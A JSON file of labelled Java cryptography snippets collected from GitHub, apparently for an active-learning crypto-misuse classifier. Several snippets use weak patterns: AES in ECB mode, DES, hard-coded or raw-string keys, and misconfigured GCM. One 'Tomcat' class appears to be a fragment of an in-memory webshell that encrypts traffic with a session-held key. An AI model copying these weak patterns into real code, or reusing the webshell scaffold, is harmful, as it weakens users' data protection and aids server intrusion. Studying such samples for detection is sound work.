[{"url": "dummy", "rawCode": "public class AESGCM {\n\n    private AESGCM() {\n        // Nothing to do here\n    }\n\n    public static byte[] decrypt(Key cek, JweObject object) throws GeneralSecurityException {\n        byte[] aad = object.getRawHeader().getBytes(StandardCharsets.US_ASCII);\n        GCMParameterSpec gcmSpec = new GCMParameterSpec(128, EncodingUtils.base64Decode(object.getIv()));\n        byte[] bytes = ByteUtils.concat(EncodingUtils.base64Decode(object.getCipherText()), EncodingUtils.base64Decode(object.getAuthTag()));\n        return cipher(cek, gcmSpec, bytes, aad, Cipher.DECRYPT_MODE);\n    }\n\n    public static byte[] cipher(Key key, GCMParameterSpec gcpSpec, byte[] bytes, byte[] aad, int mode) throws GeneralSecurityException {\n        Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\n        cipher.init(mode, key, gcpSpec);\n        cipher.updateAAD(aad);\n        return cipher.doFinal(bytes);\n    }\n}", "exampleID": 1000, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/AESGCM.java"}, {"url": "dummy", "rawCode": "public class Tomcat extends ClassLoader {\n    public static String urlPattern;\n    public static String shellString;\n    private ServletRequest Request;\n    private ServletResponse Response;\n    private HttpSession Session;\n\n\n    private byte[] Encrypt(byte[] bs) throws Exception {\n        String key = this.Session.getAttribute(\"u\").toString();\n        byte[] raw = key.getBytes(\"utf-8\");\n        SecretKeySpec skeySpec = new SecretKeySpec(raw, \"AES\");\n        Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n        cipher.init(1, skeySpec);\n        byte[] encrypted = cipher.doFinal(bs);\n        return encrypted;\n    }\n\n}", "exampleID": 1001, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/Tomcat.java"}, {"url": "dummy", "rawCode": "public class CryptUtils {\n\n\tprivate static InputStream encryptOrDecrypt(final String key, final int mode, final InputStream is) throws Throwable {\n\n\t\tDESKeySpec dks = new DESKeySpec(key.getBytes());\n\t\tSecretKeyFactory skf = SecretKeyFactory.getInstance(\"DES\");\n\t\tSecretKey desKey = skf.generateSecret(dks);\n\t\tCipher cipher = Cipher.getInstance(\"DES\"); // DES/ECB/PKCS5Padding for SunJCE\n\n\t\tif (mode == Cipher.ENCRYPT_MODE) {\n\t\t\tcipher.init(Cipher.ENCRYPT_MODE, desKey);\n\t\t\tCipherInputStream cis = new CipherInputStream(is, cipher);\n\t\t\treturn cis;\n\t\t\t//doCopy(cis, os);\n\t\t} else if (mode == Cipher.DECRYPT_MODE) {\n\t\t\tcipher.init(Cipher.DECRYPT_MODE, desKey);\n\t\t\t//CipherOutputStream cos = new CipherOutputStream(os, cipher);\n\t\t\tCipherInputStream cis = new CipherInputStream(is, cipher);\n\t\t\treturn cis;\n\t\t\t//doCopy(is, cos);\n\t\t} else {\n\t\t\treturn null;\n\t\t}\n\t}\n\n}", "exampleID": 1002, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/CryptUtils.java"}, {"url": "dummy", "rawCode": "public class MiIoCrypto {\n\n    public static byte[] encrypt(byte[] cipherText, byte[] key, byte[] iv) throws MiIoCryptoException {\n        try {\n            IvParameterSpec vector = new IvParameterSpec(iv);\n            Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n            SecretKeySpec keySpec = new SecretKeySpec(key, \"AES\");\n            cipher.init(Cipher.ENCRYPT_MODE, keySpec, vector);\n            byte[] encrypted = cipher.doFinal(cipherText);\n            return encrypted;\n        } catch (InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException\n                | InvalidAlgorithmParameterException | IllegalBlockSizeException | BadPaddingException e) {\n            throw new MiIoCryptoException(e.getMessage(), e);\n        }\n    }\n\n}", "exampleID": 1003, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/MiIoCrypto.java"}, {"url": "dummy", "rawCode": "public class Crypt {\n\n\n    public static byte[] decrypt(byte[] data, String key, String type) throws Exception {\n        byte[] result = null;\n        if (type.equals(\"java\")) {\n            byte[] raw = key.getBytes(StandardCharsets.UTF_8);\n            SecretKeySpec skeySpec = new SecretKeySpec(raw, \"AES\");\n            Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n            cipher.init(2, skeySpec);\n            result = cipher.doFinal(data);\n        }\n        return result;\n    }\n\n}", "exampleID": 1004, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/Crypt.java"}, {"url": "dummy", "rawCode": "public class AesUtils {\n\n  public static byte[] decryptToByte(byte[] associatedData, byte[] nonce, byte[] cipherData, byte[] key)\n    throws GeneralSecurityException {\n    try {\n      Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\n\n      SecretKeySpec secretKeySpec = new SecretKeySpec(key, \"AES\");\n      GCMParameterSpec spec = new GCMParameterSpec(TAG_LENGTH_BIT, nonce);\n\n      cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, spec);\n      if (associatedData != null) {\n        cipher.updateAAD(associatedData);\n      }\n      return cipher.doFinal(cipherData);\n    } catch (NoSuchAlgorithmException e) {\n        throw new IllegalStateException(e);\n    } catch (NoSuchPaddingException e) {\n        throw new IllegalStateException(e);\n    } catch (InvalidKeyException e) {\n        throw new IllegalArgumentException(e);\n    } catch (InvalidAlgorithmParameterException e) {\n        throw new IllegalArgumentException(e);\n    }\n  }\n}", "exampleID": 1005, "dataset": "init", "label": "positive", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/AesUtils.java"}, {"url": "dummy", "rawCode": "public class DemoAes {\n\n    private static void jdkAes() {\n        try {\n            // \u751f\u6210KEY\n            KeyGenerator keyGenerator = KeyGenerator.getInstance(\"AES\");\n            keyGenerator.init(128);\n            SecretKey secretKey = keyGenerator.generateKey();\n            byte[] keyBytes = secretKey.getEncoded();\n\n            // KEY \u8f6c\u6362\n            Key key = new SecretKeySpec(keyBytes, \"AES\");\n\n            // \u52a0\u5bc6\n            Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n            cipher.init(Cipher.ENCRYPT_MODE, key);\n\n            // \u5f85\u52a0\u5bc6\u5b57\u7b26\u4e32\n            String src = \"imooc security aes\";\n            byte[] result = cipher.doFinal(src.getBytes());\n            System.out.println(\"jdk aes encrypt:\" + Base64.encodeBase64String(result));\n\n            // \u89e3\u5bc6\n            cipher.init(Cipher.DECRYPT_MODE, key);\n            result = cipher.doFinal(result);\n            System.out.println(\"jdk aes decrypt:\" + new String(result));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n}", "exampleID": 1006, "label": "negative", "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/DemoAes.java"}, {"url": "dummy", "rawCode": "public final class EncryptionUtil {\n\n\tprivate static final Logger logger = LoggerFactory.getLogger(EncryptionUtil.class);\n\n\t// This variable is not final in order to swap the provider with another (like SpongyCastle)\n\t// public static String SECURITY_PROVIDER = \"BC\";\n\n\tprivate static final String SINGATURE_ALGORITHM = \"SHA1withRSA\";\n\t// Fermat F4, largest known fermat prime\n\tprivate static final BigInteger RSA_PUBLIC_EXP = new BigInteger(\"10001\", 16);\n\tprivate static final int IV_LENGTH = 16;\n\n\tprivate static byte[] processAESCiphering(boolean forEncrypting, byte[] data, SecretKey key, byte[] initVector,\n\t\t\tString securityProvider) throws GeneralSecurityException {\n\t\tIvParameterSpec ivSpec = new IvParameterSpec(initVector);\n\t\tSecretKeySpec keySpec = new SecretKeySpec(key.getEncoded(), \"AES\");\n\t\tCipher cipher = Cipher.getInstance(\"AES/CBC/PKCS7Padding\", securityProvider);\n\t\tint encryptMode = forEncrypting ? Cipher.ENCRYPT_MODE : Cipher.DECRYPT_MODE;\n\t\tcipher.init(encryptMode, keySpec, ivSpec);\n\n\t\t// process ciphering\n\t\tbyte[] output = new byte[cipher.getOutputSize(data.length)];\n\n\t\tint bytesProcessed1 = cipher.update(data, 0, data.length, output, 0);\n\t\tint bytesProcessed2 = cipher.doFinal(output, bytesProcessed1);\n\n\t\tbyte[] result = new byte[bytesProcessed1 + bytesProcessed2];\n\t\tSystem.arraycopy(output, 0, result, 0, result.length);\n\t\treturn result;\n\n\t}\n}", "exampleID": 1007, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/EncryptionUtil.java"}, {"url": "dummy", "rawCode": "public class Utils {\n\n    public static String encrypt(String plaintext, String masterKey)\n            throws Exception {\n\n        // Prepare the nonce\n        SecureRandom secureRandom = new SecureRandom();\n\n        // Nonce should be 12 bytes\n        byte[] iv = new byte[12];\n        secureRandom.nextBytes(iv);\n\n        // Prepare your key/password\n        byte[] key = pbkdf2(masterKey.toCharArray(), iv, 100, 32 * 8);\n        SecretKey secretKey = new SecretKeySpec(key, \"AES\");\n\n        Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\n        GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);\n\n        // Encryption mode on!\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey, parameterSpec);\n\n        // Encrypt the data\n        byte[] encryptedData = cipher.doFinal(stringToBytes(plaintext));\n\n        // Concatenate everything and return the final data\n        ByteBuffer byteBuffer = ByteBuffer.allocate(iv.length + encryptedData.length);\n        byteBuffer.put(iv);\n        byteBuffer.put(encryptedData);\n\n        Encoder encoder = Base64.getEncoder();\n        return encoder.encodeToString(byteBuffer.array());\n    }\n}", "exampleID": 1008, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/Utils.java"}, {"url": "dummy", "rawCode": "public class GcmEncrypt implements EncryptInterface {\n    @Override\n    public String encrypt(String key, byte[] payload) {\n        try {\n            byte[] raw = Base64.decode(key);\n            byte[] ivs = generateInitializationVector();\n            SecretKeySpec skeySpec = new SecretKeySpec(raw, \"AES\");\n            Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\n            GCMParameterSpec iv = new GCMParameterSpec(128, ivs);\n            cipher.init(1, skeySpec, iv);\n            byte[] encrypted = cipher.doFinal(pad(payload));\n            return new String(Base64.encode(byteMerger(ivs, encrypted)));\n        } catch (Exception exception) {\n            return \"0\";\n        }\n    }\n}", "exampleID": 1009, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/GcmEncrypt.java"}, {"url": "dummy", "rawCode": "public class AesCbcUtil {\n\tpublic static String decrypt(String data, String key, String iv,\n\t\t\tString encodingFormat) throws Exception {\n\t\t// initialize();\n\n\t\t// \u88ab\u52a0\u5bc6\u7684\u6570\u636e\n\t\tbyte[] dataByte = Base64.decodeBase64(data);\n\t\t// \u52a0\u5bc6\u79d8\u94a5\n\t\tbyte[] keyByte = Base64.decodeBase64(key);\n\t\t// \u504f\u79fb\u91cf\n\t\tbyte[] ivByte = Base64.decodeBase64(iv);\n\n\t\ttry {\n\t\t\tCipher cipher = Cipher.getInstance(\"AES/CBC/PKCS7Padding\");\n\n\t\t\tSecretKeySpec spec = new SecretKeySpec(keyByte, \"AES\");\n\n\t\t\tAlgorithmParameters parameters = AlgorithmParameters\n\t\t\t\t\t.getInstance(\"AES\");\n\t\t\tparameters.init(new IvParameterSpec(ivByte));\n\n\t\t\tcipher.init(Cipher.DECRYPT_MODE, spec, parameters);// \u521d\u59cb\u5316\n\n\t\t\tbyte[] resultByte = cipher.doFinal(dataByte);\n\t\t\tif (null != resultByte && resultByte.length > 0) {\n\t\t\t\tString result = new String(resultByte, encodingFormat);\n\t\t\t\treturn result;\n\t\t\t}\n\t\t\treturn null;\n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (InvalidParameterSpecException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (InvalidKeyException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (BadPaddingException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (UnsupportedEncodingException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\n\t\treturn null;\n\t}\n\n}", "exampleID": 1010, "label": "negative",  "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/AesCbcUtil.java"}, {"url": "dummy", "rawCode": "public class EncryptData {\n    private static String strDefaultKey = \"emmagee\";\n\n\tprivate Cipher encryptCipher = null;\n\n\tprivate Cipher decryptCipher = null;\n\n    public EncryptData(String strKey) {\n\t\ttry {\n\t\t\tKey key = getKey(strKey.getBytes());\n\n\t\t\tencryptCipher = Cipher.getInstance(\"DES\");\n\t\t\tencryptCipher.init(Cipher.ENCRYPT_MODE, key);\n\n\t\t\tdecryptCipher = Cipher.getInstance(\"DES\");\n\t\t\tdecryptCipher.init(Cipher.DECRYPT_MODE, key);\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\n}", "exampleID": 1011, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/EncryptData.java"}, {"url": "dummy", "rawCode": "private byte[] aeadImpl(int cipherMode, byte[] key, byte[] nonce, byte[] aad, byte[] text) {\n        try {\n            var cipher  = Cipher.getInstance(\"AES/GCM/NoPadding\");\n            var gcmSpec = new GCMParameterSpec(nT() * 8/* in bits */, nonce);\n            var aesKey  = new SecretKeySpec(key, \"AES\");\n            cipher.init(cipherMode, aesKey, gcmSpec);\n            cipher.updateAAD(aad);\n            return cipher.doFinal(text);\n        } catch (NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        } catch (NoSuchPaddingException e) {\n            throw new RuntimeException(e);\n        } catch (InvalidKeyException e) {\n            throw new RuntimeException(e);\n        } catch (InvalidAlgorithmParameterException e) {\n            throw new RuntimeException(e);\n        } catch (IllegalBlockSizeException e) {\n            throw new RuntimeException(e);\n        } catch (BadPaddingException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}", "exampleID": 1012, "label": "positive", "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/Aes128Gcm.java"}, {"url": "dummy", "rawCode": "public key from step 2\n * are sent to the server.\n */\npublic class RFBSecurityARD {\n    \n    // The type and name identifies this authentication scheme to\n    // the rest of the RFB code.\n\n    private static final String NAME = \"Mac Authentication\";\n\n    public byte getType() {\n        return RfbProto.SecTypeArd;\n    }\n    public String getTypeName() {\n        return NAME;\n    }\n\n    // credentials\n    private String username;\n    private String password;\n\n\n    private byte[] performAES128(byte[] key, byte[] plaintext) throws IOException {\n        byte[] ciphertext;\n\n        try {\n            SecretKeySpec secretKeySpec = new SecretKeySpec(key, \"AES\");\n            Cipher cipher = Cipher.getInstance(\"AES/ECB/NoPadding\");\n            cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);\n            ciphertext = cipher.doFinal(plaintext);\n        } catch (GeneralSecurityException e) {\n            e.printStackTrace();\n            throw new IOException(MSG_ERROR + \" (AES128)\");\n        }\n\n        return ciphertext;\n    }\n\n}", "exampleID": 1013, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/RFBSecurityARD.java"}, {"url": "dummy", "rawCode": "public final class EncryptionUtils {\n    \n    public static String calculateChecksum(byte[] contentKey, UUID contentKeyIdUuid) {\n        try {\n            Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n            SecretKeySpec secretKeySpec = new SecretKeySpec(contentKey, \"AES\");\n            cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);\n            byte[] encryptionResult = cipher.doFinal(contentKeyIdUuid.toString().getBytes(\"UTF8\"));\n            byte[] checksumByteArray = new byte[8];\n            System.arraycopy(encryptionResult, 0, checksumByteArray, 0, 8);\n            return Base64.encode(checksumByteArray);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n}", "exampleID": 1014, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/EncryptionUtils.java"}, {"url": "dummy", "rawCode": "public class SymmEncoder {\n\n  private static final Logger LOG = LoggerFactory.getLogger(SymmEncoder.class);\n\n  private static byte[] AesEcbDecode(byte[] encodedText, SecretKey key) {\n    try {\n      Cipher cipher = Cipher.getInstance(\"AES/ECB/NoPadding\");\n      cipher.init(Cipher.DECRYPT_MODE, key);\n      return cipher.doFinal(encodedText);\n    } catch (Exception ex) {\n      ex.printStackTrace();\n      return null;\n    }\n  }\n\n}", "exampleID": 1015, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/SymmEncoder.java"}, {"url": "dummy", "rawCode": "public String encrypt(String clearText) {\n    try {\n      Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\n      byte[] iv = new byte[GCM_IV_LENGTH_IN_BYTES];\n      new SecureRandom().nextBytes(iv);\n      cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, loadSecretFile(), new GCMParameterSpec(GCM_TAG_LENGTH_IN_BITS, iv));\n      byte[] encryptedText = cipher.doFinal(clearText.getBytes(StandardCharsets.UTF_8.name()));\n      return Base64.encodeBase64String(\n        ByteBuffer.allocate(GCM_IV_LENGTH_IN_BYTES + encryptedText.length)\n          .put(iv)\n          .put(encryptedText)\n          .array());\n    } catch (RuntimeException e) {\n      throw e;\n    } catch (Exception e) {\n      throw new IllegalStateException(e);\n    }\n  }\n\n}", "exampleID": 1016, "label": "negative", "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/AesGCMCipher.java"}, {"url": "dummy", "rawCode": "public class AESwrapper {\n\n    private final byte[] key;\n\n    public byte[] aes(final byte[] plaintext) {\n        try {\n            val aesCipher = Cipher.getInstance(\"AES/ECB/NoPadding\");\n            val secretKeySpec = new SecretKeySpec(key, \"AES\");\n            aesCipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);\n            return aesCipher.doFinal(plaintext, 0, plaintext.length);\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n}", "exampleID": 1017, "label": "negative", "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/AESwrapper.java"}, {"url": "dummy", "rawCode": "public class ProfileCipherOutputStream extends DigestingOutputStream {\n\n  private final Cipher cipher;\n\n  public ProfileCipherOutputStream(OutputStream out, byte[] key) throws IOException {\n    super(out);\n    try {\n      this.cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\n\n      byte[] nonce  = generateNonce();\n      this.cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, \"AES\"), new GCMParameterSpec(128, nonce));\n\n      super.write(nonce, 0, nonce.length);\n    } catch (NoSuchAlgorithmException e) {\n      throw new AssertionError(e);\n    } catch (NoSuchPaddingException e) {\n      throw new AssertionError(e);\n    } catch (InvalidAlgorithmParameterException e) {\n      throw new AssertionError(e);\n    } catch (InvalidKeyException e) {\n      throw new IOException(e);\n    }\n  }\n}", "exampleID": 1018, "label": "positive", "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/ProfileCipherOutputStream.java"}, {"url": "dummy", "rawCode": "public class Crypto {\n\npublic static String encryptAES(String value, String privateKey) {\n\t\ttry {\n\t\t\tbyte[] raw = privateKey.getBytes();\n\t\t\tSecretKeySpec skeySpec = new SecretKeySpec(raw, \"AES\");\n\t\t\tCipher cipher = Cipher.getInstance(\"AES\");\n\t\t\tcipher.init(Cipher.ENCRYPT_MODE, skeySpec);\n\t\t\treturn Codec.byteToHexString(cipher.doFinal(value.getBytes()));\n\t\t} catch (Exception ex) {\n\t\t\tthrow new UnexpectedException(ex);\n\t\t}\n\t}\n\n\n\npublic static String decryptAES(String value, String privateKey) {\n\t\ttry {\n\t\t\tbyte[] raw = privateKey.getBytes();\n\t\t\tSecretKeySpec skeySpec = new SecretKeySpec(raw, \"AES\");\n\t\t\tCipher cipher = Cipher.getInstance(\"AES\");\n\t\t\tcipher.init(Cipher.DECRYPT_MODE, skeySpec);\n\t\t\treturn new String(cipher.doFinal(Codec.hexStringToByte(value)));\n\t\t} catch (Exception ex) {\n\t\t\tthrow new UnexpectedException(ex);\n\t\t}\n\t}\n\n}", "exampleID": 1019, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/Crypto.java"}, {"url": "dummy", "rawCode": "public class SendCalibrations {\n\n    public static byte[] encrypt(byte[] ivBytes, byte[] keyBytes, byte[] textBytes) {\n        try {\n            AlgorithmParameterSpec ivSpec = new IvParameterSpec(ivBytes);\n            SecretKeySpec newKey = new SecretKeySpec(keyBytes, \"AES\");\n            Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n            cipher.init(Cipher.ENCRYPT_MODE, newKey, ivSpec);\n            return cipher.doFinal(textBytes);\n        } catch (Exception e) {\n            System.err.println(\"Error during encryption: \" + e.toString());\n            return errorbyte;\n        }\n    }\n\n}", "exampleID": 1020, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/SendCalibrations.java"}, {"url": "dummy", "rawCode": "public final class StringHelper {\n    private static final Logger log = Logger.getLogger();\n\n\n    public static String decrypt(String message) throws InvalidParametersException {\n        try {\n            SecretKeySpec sks = new SecretKeySpec(hexStringToByteArray(Config.ENCRYPTION_KEY), \"AES\");\n            Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n            cipher.init(Cipher.DECRYPT_MODE, sks);\n            byte[] decrypted = cipher.doFinal(hexStringToByteArray(message));\n            return new String(decrypted, Const.ENCODING);\n        } catch (NumberFormatException | IllegalBlockSizeException | BadPaddingException e) {\n            log.warning(\"Attempted to decrypt invalid ciphertext: \" + message);\n            throw new InvalidParametersException(e);\n        } catch (Exception e) {\n            assert false;\n            return null;\n        }\n    }\n\n}", "exampleID": 1021, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/StringHelper.java"}, {"url": "dummy", "rawCode": "public class Aes {\n\t\n\tpublic static String DecryptWithPassword(String password, byte[] iv, byte[] message, byte[] salt) {\n\n\t\tinitIV();\n\n\t\tString new_message = null;\n\t\t\n\t\ttry {\n\t\t\tSecretKeyFactory factory = SecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA1\");\n\t\t\tKeySpec spec = new PBEKeySpec(password.toCharArray(), salt, 65536, 256);\n\t\t\tSecretKey tmp = factory.generateSecret(spec);\n\t\t\tSecretKey secret_key = new SecretKeySpec(tmp.getEncoded(), \"AES\");\n\t\t\t\n\t\t\tCipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\n\t\t\tIvParameterSpec ivSpec = new IvParameterSpec(iv);\n\t\t\tcipher.init(Cipher.DECRYPT_MODE, secret_key, ivSpec);\n\t\t\t\n\t\t\tnew_message = new String(cipher.doFinal(message));\n\t\t\t\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tLog.e(Logger.UI, e.toString());\n\t\t\te.printStackTrace();\n\t\t} catch (BadPaddingException e) {\n\t\t\tLog.e(Logger.UI, e.toString());\n\t\t\te.printStackTrace();\n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tLog.e(Logger.UI, e.toString());\n\t\t\te.printStackTrace();\n\t\t} catch (InvalidKeySpecException e) {\n\t\t\tLog.e(Logger.UI, e.toString());\n\t\t\te.printStackTrace();\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tLog.e(Logger.UI, e.toString());\n\t\t\te.printStackTrace();\n\t\t} catch (InvalidKeyException e) {\n\t\t\tLog.e(Logger.UI, e.toString());\n\t\t\te.printStackTrace();\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\tLog.e(Logger.UI, e.toString());\n\t\t\te.printStackTrace();\n\t\t}\n\t\t\n\t\treturn new_message;\n\t}\n\t\n}", "exampleID": 1022, "label": "positive", "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/Aes.java"}, {"url": "dummy", "rawCode": "public class AesUtil {\n\t/**\n\t * \u8bc1\u4e66\u548c\u56de\u8c03\u62a5\u6587\u89e3\u5bc6\n\t *\n\t * @param associatedData associated_data\n\t * @param nonce          nonce\n\t * @param cipherText     ciphertext\n\t * @return {String} \u5e73\u53f0\u8bc1\u4e66\u660e\u6587\n\t * @throws GeneralSecurityException \u5f02\u5e38\n\t */\n\tpublic String decryptToString(byte[] associatedData, byte[] nonce, String cipherText) throws GeneralSecurityException {\n\t\ttry {\n\t\t\tCipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\n\n\t\t\tSecretKeySpec key = new SecretKeySpec(aesKey, \"AES\");\n\t\t\tGCMParameterSpec spec = new GCMParameterSpec(TAG_LENGTH_BIT, nonce);\n\n\t\t\tcipher.init(Cipher.DECRYPT_MODE, key, spec);\n\t\t\tcipher.updateAAD(associatedData);\n\n\t\t\treturn new String(cipher.doFinal(Base64.decode(cipherText)), StandardCharsets.UTF_8);\n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tthrow new IllegalStateException(e);\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tthrow new IllegalStateException(e);\n\t\t} catch (InvalidKeyException e) {\n\t\t\tthrow new IllegalArgumentException(e);\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\tthrow new IllegalArgumentException(e);\n\t\t}\n\t}\n\n}", "exampleID": 1023, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/AesUtil.java"}, {"url": "dummy", "rawCode": "public static String decrypt(String strToDecrypt, String secret) \n        {\n            try\n            {\n                setKey(secret);\n                Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n                cipher.init(Cipher.DECRYPT_MODE, secretKey);\n                return new String(cipher.doFinal(Base64.getDecoder().decode(strToDecrypt)));\n            } \n            catch (Exception e) \n            {\n                System.out.println(\"Error while decrypting: \" + e.toString());\n            }\n            return null;\n        }\n}", "exampleID": 1024, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/Vault.java"}, {"url": "dummy", "rawCode": "public class DESUtil {\n\n    public static byte[] encrypt(byte[] data, byte[] key) throws Exception {\n        Cipher cipher = Cipher.getInstance(\"DES\");\n        DESKeySpec ds = new DESKeySpec(key);\n        SecureRandom sr = new SecureRandom();\n        SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance(\"DES\");\n        SecretKey skey = secretKeyFactory.generateSecret(ds);\n        cipher.init(Cipher.ENCRYPT_MODE, skey, sr);\n        return cipher.doFinal(data);\n    }\n\n}", "exampleID": 1025, "dataset": "init", "filepath": "/Users/hongjinkang/repos/active_learning_interface/GithubExamples/Cipher/DesUtil.java"}]